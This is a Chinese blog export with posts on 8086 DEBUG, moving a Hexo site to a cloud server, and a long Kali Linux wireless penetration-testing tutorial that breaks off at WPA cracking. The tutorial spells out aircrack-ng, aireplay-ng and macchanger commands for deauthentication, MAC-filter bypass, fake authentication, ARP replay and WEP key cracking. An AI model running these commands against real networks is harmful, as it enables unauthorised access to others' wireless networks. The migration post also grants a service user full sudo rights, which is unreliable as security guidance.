使用R命令查看各寄存器设置情况 CX中存放的是程序的长度，1.exe中程序的机器码共15个字节，则CX中的内容为00FH DOS系统中.EXE文件加载过程 程序加载后，DS存放程序所在内存区的段地址 DS中的值即为PSP的段地址SA SA*16+0+256即为程序的物理地址，即为CS:IP的地址 使用U查看其他指令 从12AE:0000-12AE:000E都为程序的机器码 T命令进行单步执行 执行到int 21时，使用P命令 执行int 21后，显示Program terminated normally，返回Debug，表示程序正常结束 在此过程中，程序的加载顺序是：command加载Debug，Debug加载1.exe。返回顺序是：1.exe返回到Debug，Debug返回到command]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[迁移hexo至腾讯云]]></title>
    <url>%2F2019%2F01%2F14%2F%E8%BF%81%E7%A7%BBhexo%E8%87%B3%E8%85%BE%E8%AE%AF%E4%BA%91%2F</url>
    <content type="text"><![CDATA[最近发现访问GitHub的博客一直显示连接被重置，就算能访问但是速度很慢，体验不好。当时选择GitHub也是因为没钱买服务器。正好最近有台腾讯的云服务器闲置，想了想，直接迁过来算了 迁移前确保本地hexo运行正常，可以进行本地访问，且git已设置邮箱与用户名 云服务器端配置git安装依赖库和编译工具12yum install -y curl-devel expat-devel gettext-devel openssl-devel zlib-develyum install -y gcc perl-ExtUtils-MakeMaker 删除系统自带git1yum -y remove git 下载git选择一个目录存放git包 12cd /usr/local/srcwget https://www.kernel.org/pub/software/scm/git/git-2.24.0.tar.gz 编译安装git解压 1tar zvxf git-2.24.0.tar.gz 编译安装 123cd git-2.24.0make prefix=/usr/local/git allmake prefix=/usr/local/git install 配置git环境变量 12echo &apos;export PATH=$PATH:/usr/local/git/bin&apos; &gt;&gt; /etc/profilesource /etc/profile 验证git安装1git --version 如果此时能查看到git的版本号，说明我们已经安装成功了 新建git用户1adduser git 设置密码 1passwd git 修改权限 1234567891011chmod 740 /etc/sudoersvim /etc/sudoers在## Allow root to run any commands anywhereroot ALL=(ALL) ALL下添加如下一行git ALL=(ALL) ALL保存退出chmod 400 /etc/sudoers 设置SSH密钥 本地，使用Git Bash 创建密钥 1ssh-keygen -t rsa 云端，切换git用户，创建.ssh文件夹以及authorized_keys文件 123su gitmkdir ~/.sshvim ~/.ssh/authorized_keys 将本地的id_rsa.pub文件全部内容粘贴到云端authorized_keys文件中 云端，修改权限 123cd ~chmod 600 .ssh/authorzied_keyschmod 700 .ssh 测试 在本地，使用Git Bash测试是否能连接上服务器 1ssh -v git@服务器IP地址 若出现错误提示，尝试删除本地密钥位置known_hosts文件，成功结果为不需要密码直接SSH登录 创建网站根目录123su rootmkdir /home/hexochown git:git -R /home/hexo 创建git仓库创建一个裸仓库，裸仓库就是只保存git信息的Repository 12cd /home/git # 在 git 用户目录下创建git init --bare blog.git 修改blog.git的权限 1chown git:git -R blog.git 创建git钩子，用于自动部署123456vim /home/git/blog.git/hooks/post-receive#!/bin/shgit --work-tree=/home/hexo --git-dir=/home/git/blog.git checkout -fchmod +x /home/git/blog.git/hooks/post-receive 云服务器配置nginx安装启动安装(root权限) 1yum install -y nginx 启动 1systemctl start nginx.service 验证 1wget http://127.0.0.1 配置nginx托管文件目录123456789101112131415vim /etc/nginx/nginx.confserver &#123; listen 80 default_server; listen [::]:80 default_server; server_name www.bujige.net; #需要修改为自己的域名 root /home/hexo; #需要修改为网站根目录 # Load configuration files for the default server block. include /etc/nginx/default.d/*.conf; location / &#123; &#125; error_page 404 /404.html; location = /40x.html &#123; &#125; 重启nginx 1systemctl restart nginx.service 修改本地hexo站点配置打开本地hexo的站点配置文件,修改 1234deploy: type: git repo: git@你的云服务器的IP地址:/home/git/blog.git branch: master 部署123hexo cleanhexo ghexo d 常见错误在hexo d时出现 123hexo dbash: git-receive-pack: command not foundfatal: Could not read from remote repository. 解决方案： 服务器端执行 1sudo ln -s /usr/local/git/bin/git-receive-pack /usr/bin/git-receive-pack 域名解析设置域名解析为一个A记录，直接指向腾讯云服务器地址即可 参考连接https://blog.csdn.net/StaunchKai/article/details/82878928]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali Linux渗透测试之无线渗透]]></title>
    <url>%2F2019%2F01%2F07%2FKali-Linux%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[无线渗透无线技术特点 行业迅猛发展 互联网重要入口 边界模糊 安全实施缺失而且困难 技术人员对技术不了解而造成配置不当 企业网络私自接入AP破坏网络边界 802.11标准IEEE组织下802委员会下第11组负责开发无线局域网标准 无线标准涉及数据链路层(逻辑链路控制子层LLC、媒体访问控制子层MAC)，物理层 802.11发布于1997年 速率1Mbps或2Mbps 传输方式 红外线传输介质(未实现) 无线射频信号编码(调制) 直序扩频DSSS 跳频扩频FHSS 媒体访问方式–CSMA/CA(载波侦听多路访问／冲突避免) 根据算法侦听信道 发送数据包前进行发包声明 Reqest to Send/Clear to Send(RTS/CTS) 请求发送协议 清除发送协议 计算公式：c=b+log2(1+s/n) 无线网络传输数据量=频宽+log2(1+信号强度/噪声(信噪比)) 802.11b信号调制方法为Complementary Code Keying(CCK)–补充代码键 无线传输速率为5.5Mbit/s或11Mbit/s 工作频宽为2.4GHz(2.4GHz-2.485GHz) 分为14个重叠的信道 每个信道22MHz带宽 只有三个完全不重叠的信道 802.11a工作频宽为5GHz，拥有更多的带宽空间，可容纳更多不重叠的信道 采用正交频分复用技术(OFDM)信号调制方法 传输速率为54Mbps 每个信道20MHz带宽 变频 5.15GHz-5.35GHz室内 5.7GHz-5.8GHz室外 802.11g工作频宽为2.4GHz 采用正交频分复用技术(OFDM)信号调制方法 与802.11a速率相同，传输速率为54Mbps 可全局降速，向后兼容802.11b，并切换为CCK信号调制方法 每个信道20MHz或22MHz带宽 802.11n工作频宽为2.4GHz或5GHz 传输速率为300Mbps，最高600Mbps 采用MIMO多进多出通信技术 多天线，多无线电波，独立收发信号 可以使用40MHz信道带宽使数据传输速率翻倍 在全802.11n设备网络中，可以使用新报文格式，使速率达到最大 每个信道带宽为20MHz或40MHz 无线网络运行模式Infrastructure基础设施;基础建设 至少包含一个AP和一个STATION(客户端)，形成一个BSS(Basic Service Set)(基本服务集) AP连接到有线网络，称为DS(Distribution System)(分发系统) 连接到同一个DS的多个AP形成一个ESS(Extended Service Set)(扩展服务集合) ESSID：类似于SSID，表示多个AP连接到同一个DS上时的名称 BSSID：终端设备连接到的AP的MAC地址 SSID(Service Set Identifier)AP每秒钟约10次通过Beacon帧广播SSID 客户端连接到无线网络后也会宣告SSID AD-HOC点对点模式 也被称为Independent Basic Service Set(IBSS) 也被称为peer to peer模式 最简单的莫过于两台安装有无线网卡的计算机实施无线互联，其中一台计算机连接Internet就可以共享带宽 有至少2个STATION直接通信组成 其中一个STATION负责AP的工作 通过Beacon广播SSID 对其他STATION进行身份验证 WIRELESS DISTRIBUTION SYSTEM(WDS)与有线DS类似，只是多个AP通过无线连接组成网络 Bridging模式(网桥模式):设备连接各自的AP，各个AP进行彼此通信 Repeating模式(中继方式):只要无线范围允许，则允许所有AP和STATION进行通信 MONITOR MODEMonitor不是一种真的无线模式 对无线渗透至关重要 允许无线网卡不进行任何筛选的抓包(正常情况下是无法抓得802.11包头的) 相当于有线网络的混杂模式 适合的网卡和驱动不但可以Monitor(抓包)，更可以Injection(注入包) 无线网络硬件设备及基本概念无线网卡准备查看硬件的检测或者断开连接的信息1dmesg 查看无线网卡信息1iwconfig 无线网卡的芯片型号是成败的关键 Atheros或Realtek芯片 台式机 USB无线网卡(不支持扩展天线) PCMCIA(16位，已停产，支持802.11b) Cardbus(32位，PCMCIA8.0标准) Express Cards MiniPCI MiniPCI Express PCI接口卡 发送功率：决定远程连接的范围大小。使用扩展天线可增大发送功率，增加远程连接范围 接收灵敏性：适当降低灵敏度，接收效果更佳 查看兼容aircrack-ng suite的无线网卡型号 http://www.aircrack-ng.org/doku.php?id=compatibility_drivers#list_of_compatible_adapters 无线技术概念分贝(dB)表示2个信号之间的差异比率，用于描述设备的信号强度，是一个相对值 dBm功率值与1mW进行比较的dB值结果 dBm=10*lg（功率值/1mW） 每增加3dBm，功率增加约1倍 每增加10dBm，功率增加10倍 dBi全向天线的信号功率增益 增益是指信号功率强度增加了多少dB 增益过高的全向天线会变成定向天线 dBd定向天线的信号功率增益 全向天线在所有方向上收发信号，定向天线在指定方向的范围内收发信号 功率相同时，定向天线比全向天线传输距离更远(方向正确的情况下) 天线增益越大，信号传输距离越远 Linux无线协议栈及配置命令无线协议栈分为内核栈与用户空间栈 内核栈用于底层接口及驱动程序支持 用户空间栈为为用户提供使用命令等 802.11协议栈 IEEE80211 12iwconfigiwlist mac80211 1iw 无线网卡配置查看无线网卡查看无线网卡信息1iwconfig 查看无线网卡详细信息1iw list 查看信道频率123iwlist wlan0 frequencyiw list 扫描附近AP12345iw dev wlan0 scan | grep SSID # 查看附近APiw dev wlan0 scan | egrep &quot;DS\ Parameter\ set|SSID&quot; #查看附近AP并显示所使用的信道iwlist wlan0 scanning | egrep &quot;ESSID|Channel&quot; #查看附近AP并显示所使用的信道dev：指定扫描要使用的无线设备 添加删除网卡侦听接口添加网卡侦听接口1234service network-manager stop #将有冲突的network-manager服务停止ifconfig wlan0 up #启动外接无线网卡iw dev wlan0 interface add wlan0mon type monitor #添加无线网卡接口为monitor模式，且命名为wlan0monifconfig wlan0mon up #启动wlan0mon无线网卡 抓802.11数据包1tcpdump -i wlan0mon -s 0 -w dump.cap 删除网卡侦听接口1iw dev wlan0mon interface del RADIOTAP头部802.11帧发送和接收依赖Radiotap头完成通信过程 Linux系统在驱动和API中内建支持Radiotap 802.11帧发送之前，网卡驱动在802.11头前添加Radiotap头 当网卡接收到无线帧时，驱动通知802.11的MAC层，此帧中包含Radiotap头，须先处理Radiotap头 Radiotap为802.11帧传递额外信息，厂家可自定义，因此头长度不固定，但不可破坏Radiotap原始包头结构 Radiotap包头结构分为Header与Data两部分 Header revision：始终为0(8位) Header pad：占位符，始终为0(8位) Header length：Radiotap包头长度，可变(16位) Present flags：数据位掩码(32位)，可扩展，取决于Ext位 根据数据位掩码情况，决定包头中数据部分内容 802.11头部概念DU：数据单元，信息传输的最小数据集合 传递过程逐层封装 SDU：服务数据单元，用于高层协议的信息单元传到低层协议 PDU：协议数据单元，对于上层而言，为PDU；对于下层而言，为SDU MSDU：MAC服务数据单元，对于媒体访问控制子层MAC来说 MPDU：MAC协议数据单元，对于物理层来说为PSDU 802.11 MAC头部 Frame Control（帧控制域，16位） Duration/ID（持续时间/标识，16位）：表明该帧和它的确认帧将会占用信道多长时间 Address（地址域，各48位）：源地址（SA）、目的地址（DA）、传输工作站地址（TA）、接收工作站地址（RA） Sequence Control（序列控制域，16位）：用于对数据段进行编号，用于分段发送、重组 Frame Control（帧控制域）Protocol Version（协议版本，2位）：始终为0、1、2、3 Type（类型域，2位）：指出帧的类型(管理帧0、控制帧1、数据帧2) Subtype（子类型域，4位）：指出帧的子类型。协议规定不同类型/子类型的帧完成不同功能的操作 To DS（1位）：标识帧的传输方向，为1表明该帧是BSS向DS发送的帧 From DS（1位）：标识帧的传输方向，为1表明该帧是DS向BSS发送的帧 To DS字段与From DS字段的值决定着MAC头中4个Address字段的不同含义 00：IBSS环境(此帧为管理帧或者控制帧)。或者AD-Hoc环境下两个STATION间通信 01：表示数据帧从AP向STATION传递 10：表示数据帧从STATION向AP传递 11：表示两个AP间通信，WDS环境下的AP间的通信。或者Mesh(无线网格网络)环境下MP间的通信 More Frag（1位）：用于说明长帧被分段的情况，后续是否还有其它的帧。为1表示有后续分段。此帧可能为数据帧或管理帧。只有单播接收地址的帧会被分段 Retry（重传域，1位）：用于帧的重传，接收STATION利用该域消除重传帧。为1表示此帧为重传帧。此帧可能为数据帧或者管理帧 Pwr Mgt（能量管理域，1位）：为1表示STATION处于power_save(省电)模式。为0表示STATION处于active(活动)模式。当STATION处于省电模式时，向关联的AP发送该值为1的帧(AP不使用此字段)，省电模式下的STATION不接收数据(只可接收AP发来的特定类型的帧)，发送给它的数据帧由AP暂时缓存，AP向STATION发送唤醒类型帧将其唤醒为活动状态，STATION主动向AP索要暂存的数据帧 More Data（更多数据域，1位）：当AP缓存了至少一个MSDU时，会向省电模式的STATION发送该值为1的帧，表示有数据要传输给STATION，接收到此帧的STATION唤醒自己并向AP发送PS-Poll帧，取回由AP为其缓存的数据。或者也可用于AP有更多的广播/多播帧需要发送的情况 Protected Frame（保护域，1位）：为1表示帧体部分包含被密钥套处理过的数据；也用于表示PSK身份验证的Frame#3帧。否则为0 Order（序号域，1位）：为1表示在非QoS帧的情况下，长帧分段传送采用严格编号方式，按顺序处理。否则为0 Duration/ID（持续时间/标识）所有控制帧都是用该字段，其作用随Type/SubType变化有所不同 帧类型为PS Poll(type:1,subtype:10)时，该字段表示STATION关联的AID(association identity,关联标识) 其他情况下该字段作为一种载波侦听机制，表示接收下一帧之前需要保持的时间间隔，用于NAV(Network Allocation Vector,网络位置向量)计算，单位微秒 Sequence Control（序列控制域）包含两个子字段：Sequence Number,Fragment Number Sequence Number是每个帧的编号，数值范围是0-4095，以1为步长递增。当帧被分段时，同一帧中不同分段的Sequence Number相同 Fragment Number是被分段的帧用于标识分段位置顺序的编号，数值范围0-15，以1为步长递增 802.11 MAC数据段Frame Body变长 数据字段，未加密的最大MSDU长度为2304字节(包含最大256字节的上层头信息和可被传递的数据2048字节) 不同的加密方法会增加一定的内容长度 WEP加密：增加8字节，总长度为2312字节 TKIP(WPA1)加密：增加20字节，总长度为2324字节 CCMP(WPA2)加密：增加16字节，总长度2320字节 控制帧中无Frame Body内容 802.11 MAC校验FCS（32位）发送端对全部MAC包头和Frame Body内容进行CRC计算，计算结果即为FCS值 接收端接收到帧时，对全部MAC包头和Frame Body内容进行同样计算，与FCS值进行比较，结果一致时，向发送端返回ACK，否则丢弃帧(只对单播帧有效，FCS错误的广播/多播帧可能被接收) wireshark抓包时可能已经删除了FCS值 CONTROL FRAME(控制帧)802.11头部中的Frame Control中Type为1 控制帧是一些通知设备开始、停止传输或连接失败等情况的短消息 ACK帧接收端正确接收数据后向发送端返回ACK确认 每个单播帧需要立即确认ACK，组播和广播帧不需要ACK确认 由硬件完成，非驱动层 帧类型：1/13(Type/Subtype) PS-POLL帧RF系统的放大器：主要耗电的组件，发射前放大信号，接受并放大还原信号 AID：Association ID、关联标识，当STATION连接到一个AP时，AP会向STATION发送一个AID，存于STATION内存中 STATION省电模式唤醒 数据发送至AP(AP缓存数据包) AP向STATION通过Beacon发送TIM，其中包含AID STATION对比AID后唤醒网卡 STATION发送PS-Poll帧，请求从AP缓存中取回数据 每个帧都需要ACK确认 AP接收到ACK后，从缓存中删除数据帧 传输过程中STATION保持唤醒状态 传输结束后STATION恢复省电状态 AP接收PS-Poll帧后，可选择立即响应或延迟响应，延迟响应时AP需向STATION返回简单响应帧，通知STATION延迟响应 AID：关联ID BSSID：STATION正关联的AP地址 TA：发送此帧的STATION地址 RTS/CTS帧RTS/CTS是CSMA/CA方法的一种补充手段 降低冲突产生的可能性 正式通信之前通过请求应答机制，确信通信介质的可用性 锁定传输介质并预约通信时间 只有在传输长帧时使用，传输短帧时不会使用。驱动接口提供阈值的自定义，大于阈值的帧被视为长帧，反之为短帧 有效避免隐藏节点。无线网络内存在节点1，2，3。1与3距离太远无法直接通信，2与1和3都可进行通信。对于1来说，3就是一个隐藏节点。因RTS/CTS是广播包，当2与1通信发出RTS/CTS包时，3也会收到，知晓信道的占用，避免了冲突的发生 传输过程1发送Request to Send包给2 若未发生冲突，2返回Clear to Send给1 1传输数据 数据接收正常，2返回ACK，否则1无接收数据 RTS帧长度20字节 CTS帧长度14字节 MANAGEMENT FRAME(管理帧)802.11头部中的Frame Control中Type为0 用于协商和控制STATION与AP之间的关系 BEACON FRAMES帧AP发送的广播帧，通告无线网络的存在(BSSID) 发包频率为102.4ms(可变) 可禁止AP发送此种广播帧，达到隐藏AP的目的 PROBE REQUEST FRAMES帧用于STATION扫描现有AP 发现连接过的与未连接过的AP 扫描请求帧： 当扫描到连接过的AP时，若支持速率、ESSID都相同，AP则会响应STATION 响应帧： AUTHENTICATION FRAMES帧身份认证 Authentication Algorithm身份认证类型 身份认证由多个帧交换过程组成 0：开放系统身份认证 1：共享密钥身份认证 Authentication Seq身份认证序列号 每次身份认证过程Seq唯一 依次增长(1-65535) Challenge text共享密钥身份认证方式存在此字段 Status Code表示身份认证成功/失败 ASSOCIATION/REASSOCIATION FRAMES帧关联帧/重新关联帧 身份认证成功后，STATION执行关联操作，加入无线网络 Association Request帧STATION请求关联AP Reassociation Request帧STATION请求重新关联AP Association Response帧AP对STATION的关联请求的响应 状态码：关联成功/失败 DISASSOCIATION/DEAUTHENTICATION帧 解除关联/解除身份认证 由AP发出 Reason code：表示解除的原因 ATIM FRAMES帧只在Ad-hoc网络下使用 STATION(具有AP功能的)使用此帧通知接收STATION其有缓存的数据要接收 DATA FRAME(数据帧)802.11头部中的Frame Control中Type为2 传输用户数据 空数据帧：只包含MAC头和FCS，用于STATION声明自己将要进入省电模式 无线通信过程 Probe(探测)STATION向所有信道发出probe帧，发现AP AP应答，回复probe response WEP探测过程AP在发送Beacon时标识其使用WEP加密 STATION发现AP时，发送普通Probe帧 AP响应probe response帧时声明其采用WEP加密 WPA探测过程AP在发送Beacon时标识其使用WPA1加密 STATION发现AP时，发送普通Probe帧 AP响应probe response帧时声明其采用WPA1加密：不同厂商对802.11标准的实现方式不同；在包头中包含WPA1字段信息 Authentication(认证)STATION向AP发出验证请求 发生认证过程(过程不唯一) AP响应STATION的认证结果 WEP OPEN认证过程WEP OPEN认证与OPEN认证通信过程相同，不同的是开放身份认证前者数据被WEP加密，后者无加密 正确认证后通信数据被WEP加密 如果认证时客户端输入错误密码，认证依然可以通过，但AP将丢弃该STATION的数据包(起始向量被错误的密钥解密后完整性被破坏，导致数据传输失败) 认证响应正确，身份验证成功 WEP PSK(共享密钥)认证过程 STATION发送认证请求 AP返回随机Challenge(挑战)消息 STATION使用PSK加密Challenge并发回AP AP使用PSK解密密文，获得Challenge并与原始Challenge比对，相同则验证成功，不同则验证失败 大部分无线驱动首先多次尝试open验证，如失败则尝试PSK Association(关联)无论使用什么加密架构，关联过程完全相同 STATION发出关联请求 AP响应关联请求 关联成功，开始通信 STATION关联包中必须包含目标AP的ESSID，可以通过嗅探此关联包，发现隐藏AP的存在 加密无线安全根源 802.11基于无线电波发射信息 嗅探侦听是主要问题 加密机制是必须手段 Wired Equivalent Privacy(WEP) 802.11标准的一部分 发布后不久被发现存在安全漏洞 Wi-Fi Protected Access(WPA)取代WEP 基于802.11i标准实现WPA2 OPEN 无加密网络无任何加密机制 所有数据都可以被嗅探 STATION和AP只协商拼配参数即可连入网络 WEP加密系统使用RC4算法加密流量内容，实现机密性 使用CRC32算法检查数据完整性(ICV值) 标准采用24位initialization vector(IV)(起始向量) IV值与密码(PSK)共同组成加密key RC4算法对称流加密算法 实现简单，速度快 加密：对明文流和密钥流进行XOR运算 RC4算法生成加密key： 合并IV与PSK，利用KSA算法生成起始状态表 将起始状态表利用PRGA算法生成最终密钥流 解密：对密文流和密钥流进行XOR运算 WPA安全系统Wi-Fi Protected Access 802.11i组为提高无线安全，开发两个新的链路层加密协议 TKIP(Temporal Key Integrity Protocol)(临时密钥完整性协议)：WPA1(较之WEP可动态改变密钥) CCMP(Counter Mode with CBC-MAC)(计数器模式密码块链消息完整码协议)：WPA2 WPA加密的两种安全类型 WPA个人：使用预设共享密钥(PSK)实现身份认证 WPA企业：使用802.1X和radius服务器实现AAA(认证、授权、审计)。实现用户名密码身份认证 用户连接AP，输入帐号密码进行身份认证，AP将身份认证信息传送至后台服务器进行认证，返回认证结果 EAP协议：扩展的身份认证协议。统一兼容整合各种不同的身份认证方法的框架 WPA1802.11i第三版草案 与WEP相比： 都采用逐包进行密钥加密 128位的key和48位的IV(初始向量) RC4流加密数据 使用帧计数器避免重放攻击 TKIP使用Michael算法进行完整性校验 兼容早期版本硬件 WPA2依据802.11i完全重新设计实现 也称为RSN CCMP替代TKIP AES加密算法取代RC4 不兼容早期版本硬件 WPA企业连接过程 协商安全协议 进行身份认证 密钥分发和验证 数据加密，完整性校验 WPA个人连接过程 协商安全协议 密钥分发和验证 数据加密，完整性校验 协商安全协议过程 协商认证方式：PSK或802.1X 选择单播和组播/广播流量加密套件：TKIP或CCMP STATION通过probe获取无线网络信息：速率、加密算法、通道、名称 身份认证过程(WPA企业)基于EAP协议实现(三种认证方式)： EAP-TLS：需要互相验证客户端证书与服务器证书 EAP-TTLS PEAP：混合身份认证，只需验证服务器证书 身份认证流程： AP将其所支持的身份认证方式发送给客户端，由客户端选择自身所支持的且较为安全的身份认证方式 AP将身份验证信息发送给Radius Server进行验证 Radius Server返回Radius Accept表示认证成功，其中包含Master Key(MK) AP通过EAP消息将Master Key通知给STATION，认证成功 密钥交换无线网络设计之初用于一组无线设备进行通信 关联到同一AP的设备共享无线信道 在同一无线网络中。分为单播、广播、组播，三种方式安全特性要求不同 单播通信需要单独密钥加密通信双方流量：pairwise key(PTK)对偶密钥 组播通信需要信任域内所有成员共享同一密钥：group key(GTK)组密钥 PTK与GTK为临时性密钥，会按时更新 PMK256位(32字节)的HASH值 WPA企业MK进行TLS-PRF加密得出PMK，PMK通过计算得到PTK，PTK用于STATION与AP间的通信加密 WPA个人ESSID+PSK+迭代4096次，通过HASH计算生成PMK,PMK通过计算得到PTK，PTK用于STATION与AP间的通信加密 STATION与AP分别通过相同的算法、信息计算PMK，并不在网络中进行传递交换 PTK的生成过程 PMK+两个随机数+AP的MAC地址+STATION的MAC地址，通过HMAC-SHA1散列算法或PRF-X散列算法生成PTK PTK中分为DATA ENCR(用于数据传输加密)、DATA MIC(完整性校验)、EAPOL ENCR(进行身份认证时传输加密)、EAPOL MIC(进行身份认证时完整性校验) 四步握手生成PTK AP发送Anonce给STATION，STATION生成Snonce，通过这两个随机数与其他信息即可计算出PTK STATION将Snonce与PTK的MIC(完整性校验)发送给AP，AP拿到Snonce，计算出PTK。后进行双方PTK的MIC校验，既可校验PTK，又可判断PMK，进一步可判断PSK AP发送GTK与GTK的MIC给STATION STATION针对GTK会使用另外的算法进行计算，校验。无误后向AP回复ACK并使用密钥加密 数据加密，完整性校验三种算法 TKIP CCMP WRAP(已废弃) 无线渗透实操无线渗透第一个、最重要的任务是连接进入要渗透的无线网络(获取身份认证信息) AIRCRACK-NG基础无线渗透和审计神器 包含网络检测、嗅探抓包、包注入、密码破解等功能的工具套件 airmon-ng启动侦听配置无线网卡正常工作 1service network-manager stop 检测无线网卡硬件信息、驱动信息 1airmon-ng 检测AIRCRACK-NG工具与操作系统的兼容性问题 123airmon-ng checkairmon-ng check kill # 将可能与aircrack-ng冲突的进程kill掉 将无线网卡映射进入Kali虚拟机 启动侦听(将网卡置为monitor模式) 12345airmon-ng start wlan0 5 # 启动侦听，并指定工作信道iwlist wlan0mon channel # 查看网卡使用的无线信道airmon-ng stop wlan0mon # 关闭侦听 airodump-ng无线抓包抓包 1airodump-ng wlan2mon BSSID：AP的MAC地址 PWR：网卡接收到的信号强度，距离越近信号越强。当此值为-1时，表示驱动不支持的信号强度或STATION距离超出信号接收范围 RXQ：最近10秒成功接收的数据(数据帧、管理帧)的百分比，只有在指定信道抓包时此列才会出现 Beacons：接收到此AP发送的beacon帧数量 #Data：抓到的数据(数据帧、管理帧)的数量(在WEP加密中表示IV数量)，包含广播数据帧 #/s：最近10秒内，每秒平均抓到的帧的数量 CH：信道号(从beacon帧中获得)，信道重叠时可能会发现其他信道 MB：AP支持的最大速率 ENC：采用的无线安全技术(WEP、WPA、WPA2、OPEN) CIPHER：AP所使用的加密套件(CCMP、TKIP、WEP40、WEP104) AUTH：AP所使用的身份认证方式（MGT、PSK(WPA预设共享密钥)、SKA(WEP预设共享密钥)、OPEN） ESSID：无线网络名称。隐藏AP的此值可能为空。airodump可以从probe和association request帧中发现隐藏AP STATION：终端的MAC地址 Lost：通过sequence number判断最近10秒STATION发送丢失的数据包数量(管理帧、数据帧)。影响此值的因素：干扰、距离、发包不能收，收包不能发 Packets(Frames)：STATION发送的数据包数量 Probes：STATION正在探测的ESSID 123456airodump-ng wlan2mon -c 1-c：指定侦听的信道-bssid：指定要抓包的AP-w：输出保存--ivs：在使用WEP加密的流量中，只抓取其中ivs的信息 airodump-ng排错不显示任何AP和STATION信息 尝试禁用network-manager服务 确认无线网卡在managed模式下可以正常工作 物理机使用内置无线网卡时，确保BIOS中已启用无线网卡 尝试卸载驱动(rmmod)和重新加载驱动(modprobe) 工作一段时间后airodump-ng无法继续抓包 airmon-ng check kill 确认wpa_supplicant进程已停止 aireplay-ng注入包基本测试检测AP对probe requests广播的响应 向每个AP发送30个包 判断网卡成功发送并可接收包的能力 多次测试，避免无线通信质量不稳定 1aireplay-ng -9 wlan0mon 向隐藏AP/指定SSID注入包测试1234aireplay-ng -9 -e ESSID -a 00:00:00:00:00:00 wlan0mon-e：指定ESSID-a：指定无线AP的MAC地址 card to card 注入测试同一主机拥有两块置为monitor模式的无线网卡 其中网卡1作为发包方，网卡2模拟为一个AP，作为收包方，测试0-8号无线包是否可以注入 123aireplay-ng -9 -i wlan0mon wlan1mon-i：指定模拟为AP的收包方网卡名称 MAC地址绑定攻击网络管理员误认为MAC绑定是一种安全机制，但其实在软件层面可以将MAC地址临时或者永久修改掉 设置AP将AP设置为open模式 设置MAC地址白名单，只允许一个MAC链接到此AP 配置用于侦听的一台kali可以通过无线信道侦听，获取到与AP正常通信的无线网卡的MAC地址 12345service network-manager stopairmon-ng check kill映射无线网卡至Kali虚拟机airmon-ng start wlan0 11 # 设置无线网卡与`AP`处于同一信道airodump-ng wlan0mon -c 11 --bssid 00:00:00:00:00:00 配置用于攻击的另一台kali当一个AP采用open认证方式，无任何加密方法，但无法进行连接时，则可能进行MAC地址绑定 修改无法连接AP的无线网卡的MAC地址123ifconfig wlan0 downmacchanger -m 00:00:00:00:00:00 wlan0 # 将wlan0网卡的MAC地址进行修改 -m：指定要修改成的MAC地址ifconfig wlan0 up 此时使用修改过MAC地址的无线网卡连接配置MAC地址绑定的AP，则可实现连接 此时，正常通信的无线网卡与修改过MAC地址的无线网卡两者的MAC地址相同，当两者与AP进行通信时，会出现丢包的情况 WEP攻击WEP密码破解原理IV值并非完全随机 每224个包可能出现一次IV重用 收集大量IV值之后找出相同IV及其对应密文，分析得出共享密码 ARP回包中包含IV IV足够多的情况下，任何复杂程度的WEP密码都可以被破解 WEP共享密钥破解 启动monitor模式 启动抓包并保存 抓取正常设备与AP的Challenge(挑战)消息和使用PSK加密Challenge的消息，通过这两者的XOR计算得出keysrteam(密钥流) 当STATION与AP进行关联身份认证时才可能会抓取到两者消息，正常STATION与AP在通信过程中不会产生这两者信息，可以使用aireplay-ng的Deauthentication(0号包注入方式)使STATION与AP断开连接，此时STATION与AP会重新尝试连接进行身份认证，则可进行抓取 Deauthentication攻击方式在无客户端情况下攻击无效 Deauthentication排错： 物理足够接近被攻击者 与被攻击者使用相同的无线标准b、n、g STATION可能拒绝广播帧，建议-c指定STATION 利用keystream即可与AP建立关联(fake authentication) fake authentication排错： 某些AP验证客户端MAC地址OUI(MAC地址前三个字节)，确保MAC地址非任意伪造 AP存在MAC地址绑定，首先进行MAC地址绑定攻击，再进行WEP攻击 报错denied(code 1)is WPA in use,表示AP使用WPA/WPA2加密方式，非WEP，不支持fake authentication 使用真实MAC地址 物理靠近AP 侦听信道必须与AP的工作信道一致 执行ARP重放 airodump-ng抓包界面中的#Data数值在WEP中表示抓取到的IV值 AP发出的ARP响应包中包含有IV值，通过进行ARP的重放，获取大量IV值 首先，攻击者执行ARP重放，但此时攻击者没有合法的ARP请求包 攻击者使用Deauthentication(0号包注入方式)使STATION与AP断开连接，此时STATION与AP会重新尝试连接，重新进行ARP请求，抓取STATION的ARP请求包，攻击者利用此包进行重放即可获取大量ARP响应包，获取大量IV值 使用已抓取到的IV值，尝试进行密码破解 攻击过程 设置AP为WEP加密方式，密钥长度128位 侦听无线信道，保存 1airodump-ng -c 11 --bssid 00:00:00:00:00:00 -w wep wlan0mon 抓取到的XOR计算的keystream保存在当前目录下的.xor文件中，以密文方式存储 使用Deauthentication攻击方式抓取计算keystream，每次攻击发送128个包，64个给AP，64个给STATION，需要足够接近被攻击者 12345aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 11:11:11:11:11:11 wlan0mon-0：第零种包注入方式，只注入包一次，0表示持续发包-a：指定AP的MAC地址-c：指定STATION的MAC地址，不指定此参数时，以广播方式攻击所有客户端 利用keystream与AP建立关联 123456789aireplay-ng -1 60 -e kifi -y wep-xxx.xor -a 00:00:00:00:00:00 -h 11:11:11:11:11:11 wlan0mon-1：第一种包注入方式，每60秒进行重新关联-e：指定要关联的AP的ESSID-y：指定keystream文件-a：指定AP的MAC地址-h：指定攻击者无线网卡的MAC地址-o：每次身份认证只发一次认证数据包，默认为重复三次-q x：每x秒发送keep-live帧 执行ARP重放 12345aireplay-ng -3 -b 00:00:00:00:00:00 -h 11:11:11:11:11:11 wlan0mon-3：第三种包注入方式-b：指定AP的MAC地址-h：指定攻击者无线网卡的MAC地址 触发ARP包的产生 12345aireplay-ng -0 1 -a 00:00:00:00:00:00 -c 11:11:11:11:11:11 wlan0mon-0：第零种包注入方式，只注入包一次-a：指定AP的MAC地址-c：指定STATION的MAC地址 AP密码破解 1aircrack-ng wep-01.cap WPA攻击WPA PSK攻击WPA无WEP的弱点，只可使用暴力破解方式 PSK破解过程 